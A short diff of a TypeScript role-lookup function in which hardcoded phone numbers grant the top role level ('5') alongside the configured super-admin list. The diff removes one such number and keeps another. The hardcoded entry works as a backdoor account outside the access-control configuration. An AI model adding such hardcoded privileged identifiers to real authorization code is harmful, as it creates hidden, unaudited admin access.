@@ -22,8 +22,7 @@ export function getUserRole(userId: string, usersDb: Record<string, string>): st
     const incomingNum = userId.replace(/\D/g, '');
         if (
           checkMatch(RBAC.superAdmin, incomingNum) ||
-          checkMatch("5511927018683", incomingNum) ||
-          checkMatch("5511920604709", incomingNum)
+                    checkMatch("5511927018683", incomingNum)
         )
           return "5";
     for (const [dbNum, roleLvl] of Object.entries(usersDb || {})) {
